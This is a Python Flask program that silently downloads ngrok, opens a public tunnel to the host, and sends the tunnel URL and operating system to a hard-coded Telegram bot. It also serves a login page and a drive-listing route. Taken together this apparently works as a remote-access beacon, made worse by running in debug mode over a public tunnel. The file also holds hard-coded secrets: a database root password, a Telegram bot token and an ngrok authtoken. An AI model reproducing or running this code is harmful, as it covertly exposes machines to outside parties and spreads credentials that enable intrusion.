import os
import platform
import subprocess
import time
import requests
import zipfile  # Add this import
import stat  # Add this import
from flask import Flask, render_template, request, redirect, url_for, session
from flask_mysqldb import MySQL
from urllib.parse import unquote
from http.server import SimpleHTTPRequestHandler, HTTPServer

app = Flask(__name__)
app.secret_key = "supersecretkey"

# Configure MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'gowtham2812'
app.config['MYSQL_DB'] = 'vspolit_db'

mysql = MySQL(app)

# Telegram Bot Configuration
BOT_TOKEN = "6663901080:AAH3lsdwVI2Q6BEo_gwJUnsjlqLBonzfn0s"
CHAT_ID = "1660587036"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Send ngrok URL to Telegram
def send_url_to_telegram(public_url, os_info):
    payload = {
        "chat_id": CHAT_ID,
        "text": f"Ngrok Public URL: {public_url}\nOperating System: {os_info}"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, data=payload)
        if response.status_code != 200:
            print(f"Failed to send to Telegram: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

# Download and setup ngrok
def download_ngrok():
    system = platform.system().lower()
    if system == "windows":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    elif system == "linux":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
    elif system == "darwin":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
    else:
        raise Exception("Unsupported platform")

    local_filename = "ngrok.zip"
    print("Downloading ngrok...")
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    with zipfile.ZipFile(local_filename, 'r') as zip_ref:
        zip_ref.extractall(".")
    os.remove(local_filename)

    if system != "windows":
         os.chmod("ngrok", stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    print("ngrok downloaded and extracted.")

# Configure ngrok auth token
def configure_ngrok_authtoken():
    authtoken = "2pDRBFLOSbsnWjTJoJI8Fy2AWF4_2FLnrWQQc1tv3Qyrpw1z1"
    print("Configuring ngrok authtoken...")
    command = f"./ngrok authtoken {authtoken}" if platform.system().lower() != "windows" else f".\\ngrok.exe authtoken {authtoken}"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        print(f"Error configuring ngrok: {result.stderr.decode()}")
    else:
        print("Ngrok authtoken configured successfully.")    

# Start ngrok and retrieve public URL
def start_ngrok(port):
    if not os.path.exists("ngrok") and not os.path.exists("ngrok.exe"):
        download_ngrok()
    configure_ngrok_authtoken()

    command = f"./ngrok http {port}" if platform.system().lower() != "windows" else f".\\ngrok.exe http {port}"
    print("Starting ngrok...")
    ngrok_process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    time.sleep(5)

    public_url = None
    try:
        for _ in range(20):
            response = requests.get("http://127.0.0.1:4040/api/tunnels")
            if response.status_code == 200:
                tunnels = response.json().get("tunnels", [])
                if tunnels:
                    public_url = tunnels[0].get("public_url")
                    break
            time.sleep(1)
    except Exception as e:
        print(f"Error fetching public URL: {e}")

    if public_url:
        print(f"Ngrok Public URL: {public_url}")
        os_info = platform.system()
        send_url_to_telegram(public_url, os_info)
    else:
        print("Failed to retrieve ngrok public URL.")
    
    return public_url

# Login route
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Validate user credentials
        cursor = mysql.connection.cursor()
        cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))
        user = cursor.fetchone()
        cursor.close()

        if user:
            session['user'] = username
            return redirect(url_for('drive_list'))
        else:
            return "Invalid credentials, please try again!"

    return render_template('login.html')

# Drive list route
@app.route('/drives')
def drive_list():
    if 'user' not in session:
        return redirect(url_for('login'))

    drives = []
    if platform.system().lower() == 'windows':
        drives = [f"{chr(x)}:" for x in range(65, 91) if os.path.exists(f"{chr(x)}:\\")]
    else:
        drives = os.listdir('/')

    return f"Drives available: {', '.join(drives)}"

if __name__ == "__main__":
    public_url = start_ngrok(5000)
    if public_url:
        print(f"Public URL: {public_url}")

    app.run(debug=True, port=5000)
